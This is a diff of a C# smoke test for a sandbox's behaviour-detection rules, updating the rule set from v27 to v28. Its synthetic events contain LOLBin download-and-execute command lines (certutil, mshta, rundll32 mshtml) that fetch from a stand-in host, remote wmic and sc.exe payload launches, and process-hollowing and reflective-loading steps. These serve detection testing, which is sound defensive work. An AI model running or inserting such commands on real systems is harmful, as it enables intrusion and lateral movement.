@@ -6,28 +6,28 @@ using KSword.Sandbox.SmokeTests.Framework;
 namespace KSword.Sandbox.SmokeTests.Scenarios;
 
 /// <summary>
-/// Compile-only repository guard for the v27 behavior-rule expansion. Inputs
+/// Compile-only repository guard for the v28 behavior-rule expansion. Inputs
 /// are behavior-rules.json plus synthetic local events; processing verifies
-/// that the new Sigma/Elastic/Splunk/LOLBAS-inspired rules stay constrained by
-/// local fields and v26 self-noise guards without running a smoke test here.
+/// that the Sigma/Elastic/Splunk/LOLBAS-inspired rules stay constrained by
+/// local fields and retain v27 self-noise guards without running smoke here.
 /// </summary>
-internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
+internal sealed class BehaviorRuleV28ExpansionScenario : ISmokeTestScenario
 {
     private static readonly string[] RequiredRuleIds =
     [
-        "persistence-ifeo-verifierdll-user-writable",
-        "persistence-bits-notifycmdline-user-writable",
-        "injection-createremotethread-loadlibrary-user-dll",
-        "injection-queueuserapc-loadlibrary-suspended-process",
-        "lateral-svcctl-remote-service-user-writable-binary",
-        "lateral-winrm-encoded-command-remote-target",
-        "anti-sandbox-tool-enumeration-gated-exit",
-        "anti-sandbox-sleep-skew-gated-execution",
-        "download-execute-certutil-urlcache-user-launch",
-        "download-execute-mshta-remote-scriptlet-user-payload"
+        "persistence-wmi-commandline-consumer-user-writable",
+        "persistence-com-scriptleturl-remote-clsid-hijack",
+        "injection-hollowing-unmap-write-setcontext-resume",
+        "injection-reflective-loader-user-writable-module",
+        "lateral-dcom-shellwindows-remote-script-launch",
+        "lateral-wmi-admin-share-payload-execution",
+        "anti-sandbox-device-object-probe-exit-gate",
+        "anti-sandbox-window-title-analysis-gate",
+        "download-execute-rundll32-mshtml-remote-script",
+        "download-execute-installutil-remote-assembly-launch"
     ];
 
-    public string ScenarioId => "behavior.rules-v27-expansion";
+    public string ScenarioId => "behavior.rules-v28-expansion";
 
     /// <inheritdoc />
     public Task<SmokeTestResult> RunAsync(SmokeTestContext context, CancellationToken cancellationToken = default)
@@ -39,14 +39,13 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
 
         var rules = RuleEngine.LoadRuleSet(behaviorRulesPath);
         SmokeAssert.True(
-            string.Equals(rules.Version, "2026-07-12-v27-behavior-rule-expansion", StringComparison.OrdinalIgnoreCase) ||
             string.Equals(rules.Version, "2026-07-12-v28-behavior-rule-expansion", StringComparison.OrdinalIgnoreCase),
-            "Behavior rules should carry the v27/v28 behavior-rule expansion version.");
+            "Behavior rules should carry the v28 behavior-rule expansion version.");
 
         var indexedRules = rules.Rules.ToDictionary(rule => rule.Id, StringComparer.OrdinalIgnoreCase);
         foreach (var ruleId in RequiredRuleIds)
         {
-            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"v27 rule '{ruleId}' is missing.");
+            SmokeAssert.True(indexedRules.TryGetValue(ruleId, out var rule), $"v28 rule '{ruleId}' is missing.");
             AssertRuleContract(rule!);
         }
 
@@ -57,7 +56,7 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
         {
             ScenarioId = ScenarioId,
             Passed = true,
-            Message = $"{RequiredRuleIds.Length} v27 behavior rules load, match constrained synthetic events, and retain v26 self-noise guards."
+            Message = $"{RequiredRuleIds.Length} v28 behavior rules load, match constrained synthetic events, and retain v27 self-noise guards."
         });
     }
 
@@ -88,8 +87,11 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
         SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "source", "r0collector"), $"Rule '{rule.Id}' should exclude R0 collector source rows.");
         SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "collectorSelfNoise", "true"), $"Rule '{rule.Id}' should exclude collector self-noise.");
         SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "collectorNoise", "true"), $"Rule '{rule.Id}' should exclude collector noise.");
+        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "noise", "true"), $"Rule '{rule.Id}' should exclude generic noise.");
+        SmokeAssert.True(ContainsGuard(rule.ExcludeDataContains, "selfNoise", "true"), $"Rule '{rule.Id}' should exclude generic self-noise.");
         SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "behaviorCounted", "false"), $"Rule '{rule.Id}' should exclude behaviorCounted=false rows.");
         SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "nonbehavior", "true"), $"Rule '{rule.Id}' should exclude nonbehavior=true rows.");
+        SmokeAssert.True(ContainsGuard(rule.ExcludeDataEquals, "sampleBehaviorCandidate", "false"), $"Rule '{rule.Id}' should exclude sampleBehaviorCandidate=false rows.");
     }
 
     private static void AssertSyntheticMatches(BehaviorRuleSet rules)
@@ -101,7 +103,7 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
 
         foreach (var ruleId in RequiredRuleIds)
         {
-            SmokeAssert.True(findingIds.Contains(ruleId), $"Synthetic v27 event should match '{ruleId}'.");
+            SmokeAssert.True(findingIds.Contains(ruleId), $"Synthetic v28 event should match '{ruleId}'.");
         }
     }
 
@@ -114,7 +116,7 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
 
         foreach (var ruleId in RequiredRuleIds)
         {
-            SmokeAssert.True(!noiseFindings.Contains(ruleId), $"Self-noise event should not match v27 rule '{ruleId}'.");
+            SmokeAssert.True(!noiseFindings.Contains(ruleId), $"Self-noise event should not match v28 rule '{ruleId}'.");
         }
     }
 
@@ -124,26 +126,25 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
         [
             new SandboxEvent
             {
+                EventType = "wmi.event_consumer",
+                Source = "guest",
+                Data =
+                {
+                    ["consumerName"] = "UpdaterConsumer",
+                    ["consumerType"] = "CommandLineEventConsumer",
+                    ["filterName"] = "UpdaterFilter",
+                    ["commandLineTemplate"] = @"C:\Users\Public\stage\consumer.exe"
+                }
+            },
+            new SandboxEvent
+            {
                 EventType = "registry.set",
-                Source = "guest",
-                Path = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\VerifierDll",
+                Source = "driver",
+                Path = @"HKCU\Software\Classes\CLSID\{11111111-1111-1111-1111-111111111111}\ScriptletURL",
                 Data =
                 {
-                    ["path"] = @"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe\VerifierDll",
-                    ["valueName"] = "VerifierDll",
-                    ["value"] = @"C:\Users\Public\stage\hook.dll"
-                }
-            },
-            new SandboxEvent
-            {
-                EventType = "bits.job.modified",
-                Source = "guest",
-                Data =
-                {
-                    ["jobType"] = "bits",
-                    ["jobId"] = "{11111111-1111-1111-1111-111111111111}",
-                    ["valueName"] = "NotifyCmdLine",
-                    ["value"] = @"C:\Users\Public\stage\notify.exe"
+                    ["valueName"] = "ScriptletURL",
+                    ["value"] = "https://example.invalid/payload.sct"
                 }
             },
             new SandboxEvent
@@ -153,9 +154,9 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
                 ProcessName = "payload.exe",
                 Data =
                 {
-                    ["operation"] = "VirtualAllocEx WriteProcessMemory CreateRemoteThread LoadLibrary",
-                    ["targetProcessName"] = "explorer.exe",
-                    ["dllPath"] = @"C:\Users\Public\stage\inject.dll"
+                    ["operation"] = "CreateProcess suspended NtUnmapViewOfSection VirtualAllocEx WriteProcessMemory SetThreadContext ResumeThread",
+                    ["targetImage"] = "notepad.exe",
+                    ["payloadPath"] = @"C:\Users\Public\stage\hollow.exe"
                 }
             },
             new SandboxEvent
@@ -165,35 +166,34 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
                 ProcessName = "payload.exe",
                 Data =
                 {
-                    ["operation"] = "CreateProcess suspended QueueUserAPC LoadLibrary",
-                    ["targetProcessName"] = "notepad.exe",
-                    ["payloadPath"] = @"C:\Users\Public\stage\apc.dll"
+                    ["operation"] = "VirtualAlloc WriteProcessMemory DllMain",
+                    ["loader"] = "ReflectiveLoader manual map",
+                    ["modulePath"] = @"C:\Users\Public\stage\reflective.dll",
+                    ["targetProcessName"] = "explorer.exe"
                 }
             },
             new SandboxEvent
             {
-                EventType = "service.created",
+                EventType = "dcom.activation",
                 Source = "guest",
-                ProcessName = "sc.exe",
-                CommandLine = @"sc.exe \\workstation01 create Updater binPath= C:\Users\Public\stage\svc.exe",
+                ProcessName = "payload.exe",
                 Data =
                 {
-                    ["remoteHost"] = "workstation01",
-                    ["serviceName"] = "Updater",
-                    ["serviceBinary"] = @"C:\Users\Public\stage\svc.exe",
-                    ["operation"] = "CreateService"
+                    ["remoteHost"] = "workstation03",
+                    ["comClass"] = "ShellWindows",
+                    ["command"] = @"powershell.exe -File C:\Users\Public\stage\remote.ps1"
                 }
             },
             new SandboxEvent
             {
-                EventType = "process.start",
+                EventType = "wmi.process_create",
                 Source = "guest",
-                ProcessName = "powershell.exe",
-                CommandLine = @"powershell.exe Invoke-Command -ComputerName workstation02 -EncodedCommand SQBFAFgA",
+                ProcessName = "wmic.exe",
+                CommandLine = @"wmic.exe /node:workstation04 process call create \\workstation04\ADMIN$\stage\payload.exe",
                 Data =
                 {
-                    ["remoteHost"] = "workstation02",
-                    ["scriptBlockText"] = "FromBase64String IEX Invoke-Expression"
+                    ["remoteHost"] = "workstation04",
+                    ["payloadPath"] = @"\\workstation04\ADMIN$\stage\payload.exe"
                 }
             },
             new SandboxEvent
@@ -203,46 +203,45 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
                 ProcessName = "payload.exe",
                 Data =
                 {
-                    ["check"] = "vmtools service process enumeration",
-                    ["action"] = "exit gate",
-                    ["matchedName"] = "vmtoolsd.exe"
+                    ["probe"] = "CreateFile device driver probe",
+                    ["artifact"] = "VBoxMiniRdrDN",
+                    ["action"] = "exit gate"
                 }
             },
             new SandboxEvent
             {
-                EventType = "api.sleep",
+                EventType = "anti_sandbox.check",
                 Source = "guest",
                 ProcessName = "payload.exe",
                 Data =
                 {
-                    ["check"] = "GetTickCount sleep time skew",
-                    ["action"] = "abort gate",
-                    ["requestedSleepMs"] = "60000",
-                    ["observedSkewMs"] = "2500"
+                    ["check"] = "EnumWindows window title scan",
+                    ["matchedName"] = "Process Monitor",
+                    ["action"] = "suppress execution gate"
                 }
             },
             new SandboxEvent
             {
                 EventType = "download.execute",
                 Source = "guest",
-                ProcessName = "certutil.exe",
-                CommandLine = @"certutil.exe -urlcache -split -f https://example.invalid/a.exe C:\Users\Public\stage\a.exe",
+                ProcessName = "rundll32.exe",
+                CommandLine = "rundll32.exe mshtml,RunHTMLApplication javascript:GetObject(\"script:https://example.invalid/a.sct\")",
                 Data =
                 {
-                    ["sourceUrl"] = "https://example.invalid/a.exe",
-                    ["executedPath"] = @"C:\Users\Public\stage\a.exe"
+                    ["sourceUrl"] = "https://example.invalid/a.sct",
+                    ["executedPath"] = @"C:\Users\Public\stage\rundll.exe"
                 }
             },
             new SandboxEvent
             {
                 EventType = "download.execute",
                 Source = "guest",
-                ProcessName = "mshta.exe",
-                CommandLine = "mshta.exe https://example.invalid/payload.hta",
+                ProcessName = "InstallUtil.exe",
+                CommandLine = @"InstallUtil.exe C:\Users\Public\stage\assembly.exe",
                 Data =
                 {
-                    ["sourceUrl"] = "https://example.invalid/payload.hta",
-                    ["executedPath"] = @"C:\Users\Public\stage\payload.exe"
+                    ["sourceUrl"] = "https://example.invalid/assembly.exe",
+                    ["executedPath"] = @"C:\Users\Public\stage\assembly.exe"
                 }
             }
         ];
@@ -256,7 +255,12 @@ internal sealed class BehaviorRuleV27ExpansionScenario : ISmokeTestScenario
                 var data = new Dictionary<string, string>(evt.Data, StringComparer.OrdinalIgnoreCase)
                 {
                     ["collectorSelfNoise"] = "true",
-                    ["behaviorCounted"] = "false"
+                    ["collectorNoise"] = "true",
+                    ["noise"] = "true",
+                    ["selfNoise"] = "true",
+                    ["behaviorCounted"] = "false",
+                    ["nonbehavior"] = "true",
+                    ["sampleBehaviorCandidate"] = "false"
                 };
 
                 return evt with
